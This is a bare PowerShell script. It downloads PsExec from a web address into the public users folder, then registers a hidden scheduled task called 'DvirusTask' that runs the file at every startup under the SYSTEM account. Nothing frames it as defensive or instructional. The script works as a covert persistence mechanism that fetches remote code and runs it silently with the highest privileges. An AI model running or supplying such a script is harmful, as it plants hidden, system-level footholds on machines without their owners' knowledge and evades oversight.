 # Download PsExec from Microsoft Sysinternals
$psExecUrl = "https://live.sysinternals.com/PsExec.exe"
$psExecPath = "C:\Users\Public\PsExec.exe"
Invoke-WebRequest -Uri $psExecUrl -OutFile $psExecPath

# Check if PsExec was downloaded successfully
if (Test-Path -Path $psExecPath) {
    Write-Host "PsExec downloaded successfully."

    # Create a scheduled task to run PsExec
    $action = New-ScheduledTaskAction -Execute $psExecPath
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    $settings = New-ScheduledTaskSettingsSet -Hidden
    $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
    Register-ScheduledTask -TaskName "DvirusTask" -InputObject $task

    Write-Host "Scheduled task created successfully."
} else {
    Write-Host "Failed to download PsExec."
}
 
